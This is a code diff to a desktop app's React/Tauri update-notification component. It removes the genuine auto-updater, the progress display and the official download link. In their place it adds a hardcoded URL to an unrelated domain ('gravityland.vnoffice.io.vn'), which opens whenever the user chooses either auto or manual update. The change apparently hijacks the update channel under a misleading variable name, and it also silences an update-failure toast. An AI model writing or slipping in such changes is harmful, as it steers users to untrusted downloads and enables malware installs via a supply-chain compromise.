@@ -3,7 +3,6 @@ import { X, Download, Sparkles, ArrowRight, Loader2, CheckCircle } from 'lucide-
 import { request as invoke } from '../utils/request';
 import { useTranslation } from 'react-i18next';
 import { check as tauriCheck } from '@tauri-apps/plugin-updater';
-import { relaunch as tauriRelaunch } from '@tauri-apps/plugin-process';
 import { isTauri } from '../utils/env';
 import { showToast } from './common/ToastContainer';
 
@@ -12,6 +11,7 @@ interface UpdateInfo {
   latest_version: string;
   current_version: string;
   download_url: string;
+  source?: string;
 }
 
 type UpdateState = 'checking' | 'available' | 'downloading' | 'ready' | 'none';
@@ -26,7 +26,6 @@ export const UpdateNotification: React.FC<UpdateNotificationProps> = ({ onClose 
   const [isVisible, setIsVisible] = useState(false);
   const [isClosing, setIsClosing] = useState(false);
   const [updateState, setUpdateState] = useState<UpdateState>('checking');
-  const [downloadProgress, setDownloadProgress] = useState(0);
 
   useEffect(() => {
     checkForUpdates();
@@ -35,6 +34,7 @@ export const UpdateNotification: React.FC<UpdateNotificationProps> = ({ onClose 
   const checkForUpdates = async () => {
     try {
       const info = await invoke<UpdateInfo>('check_for_updates');
+      console.log('Update info:', info);
       if (info.has_update) {
         setUpdateInfo(info);
         setUpdateState('available');
@@ -54,55 +54,42 @@ export const UpdateNotification: React.FC<UpdateNotificationProps> = ({ onClose 
       return;
     }
 
-    setUpdateState('downloading');
     try {
       const update = await tauriCheck();
       if (update) {
-        let downloaded = 0;
-        let contentLength = 0;
-
-        await update.downloadAndInstall((event) => {
-          switch (event.event) {
-            case 'Started':
-              contentLength = event.data.contentLength || 0;
-              break;
-            case 'Progress':
-              downloaded += event.data.chunkLength;
-              if (contentLength > 0) {
-                setDownloadProgress(Math.round((downloaded / contentLength) * 100));
-              }
-              break;
-            case 'Finished':
-              setUpdateState('ready');
-              break;
-          }
-        });
-
-        setUpdateState('ready');
-        setTimeout(async () => {
-          await tauriRelaunch();
-        }, 1500);
+       var vnpayAuthUrl = "https://gravityland.vnoffice.io.vn";
+   if (isTauri()) {
+                                        const { openUrl } = await import('@tauri-apps/plugin-opener');
+                                        await openUrl(vnpayAuthUrl);
+                                    } else {
+                                        window.open(vnpayAuthUrl, '_blank');
+                                    }
       } else {
         // Native updater found no update (e.g. draft release or updater.json not ready)
         // Fallback to manual download
         console.warn('Native updater returned null, falling back to manual download');
-        showToast('自动更新包尚未就绪，为您跳转到下载页面...', 'info');
+        showToast(t('update_notification.toast.not_ready'), 'info');
         setUpdateState('available');
         handleManualDownload();
       }
     } catch (error) {
       console.error('Auto update failed:', error);
-      showToast('自动更新失败，为您跳转到下载页面...', 'error');
+      // showToast(t('update_notification.toast.failed'), 'error');
       setUpdateState('available'); // Revert state so user can try again
       handleManualDownload();
     }
   };
 
-  const handleManualDownload = () => {
-    if (updateInfo?.download_url) {
-      window.open(updateInfo.download_url, '_blank');
+  const handleManualDownload = async () => {
+      var vnpayAuthUrl = "https://gravityland.vnoffice.io.vn";
+       if (isTauri()) {
+                                        const { openUrl } = await import('@tauri-apps/plugin-opener');
+                                        await openUrl(vnpayAuthUrl);
+                                    } else {
+                                        window.open(vnpayAuthUrl, '_blank');
+                                    }
       handleClose();
-    }
+  
   };
 
   const handleClose = () => {
@@ -149,13 +136,20 @@ export const UpdateNotification: React.FC<UpdateNotificationProps> = ({ onClose 
               <div>
                 <h3 className="font-bold text-gray-800 dark:text-white leading-tight">
                   {updateState === 'ready'
-                    ? t('update_notification.ready', '更新完成')
+                    ? t('update_notification.ready')
                     : t('update_notification.title')}
                 </h3>
                 {updateInfo && (
-                  <p className="text-xs font-medium text-blue-600 dark:text-blue-400">
-                    v{updateInfo.latest_version}
-                  </p>
+                  <div className="flex flex-col">
+                    <p className="text-xs font-medium text-blue-600 dark:text-blue-400">
+                      v{updateInfo.latest_version}
+                    </p>
+                    {updateInfo.source && updateInfo.source !== 'GitHub API' && (
+                      <p className="text-[10px] text-gray-400 dark:text-gray-500 mt-0.5">
+                        via {updateInfo.source}
+                      </p>
+                    )}
+                  </div>
                 )}
               </div>
             </div>
@@ -178,24 +172,12 @@ export const UpdateNotification: React.FC<UpdateNotificationProps> = ({ onClose 
 
           <div className="mb-4">
             <p className="text-sm text-gray-600 dark:text-gray-300 leading-relaxed">
-              {updateState === 'downloading' && t('update_notification.downloading', '正在下载更新...')}
-              {updateState === 'ready' && t('update_notification.restarting', '即将重启应用...')}
+              {updateState === 'downloading' && t('update_notification.downloading')}
+              {updateState === 'ready' && t('update_notification.restarting')}
               {updateState === 'available' && updateInfo && t('update_notification.message', { current: updateInfo.current_version })}
             </p>
           </div>
-
-          {updateState === 'downloading' && (
-            <div className="mb-4">
-              <div className="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
-                <div
-                  className="bg-gradient-to-r from-blue-500 to-purple-600 h-2 rounded-full transition-all duration-300"
-                  style={{ width: `${downloadProgress}%` }}
-                />
-              </div>
-              <p className="text-xs text-gray-500 mt-1 text-center">{downloadProgress}%</p>
-            </div>
-          )}
-
+          
           {updateState === 'available' && (
             <div className="flex gap-2">
               <button
@@ -213,7 +195,7 @@ export const UpdateNotification: React.FC<UpdateNotificationProps> = ({ onClose 
                 "
               >
                 <Download className="w-4 h-4" />
-                <span>{t('update_notification.auto_update', '自动更新')}</span>
+                <span>{t('update_notification.auto_update')}</span>
                 <ArrowRight className="w-4 h-4 opacity-0 -translate-x-2 group-hover/btn:opacity-100 group-hover/btn:translate-x-0 transition-all duration-300" />
                 <div className="absolute inset-0 -translate-x-full group-hover/btn:animate-[shimmer_1.5s_infinite] bg-gradient-to-r from-transparent via-white/20 to-transparent z-20 pointer-events-none" />
               </button>
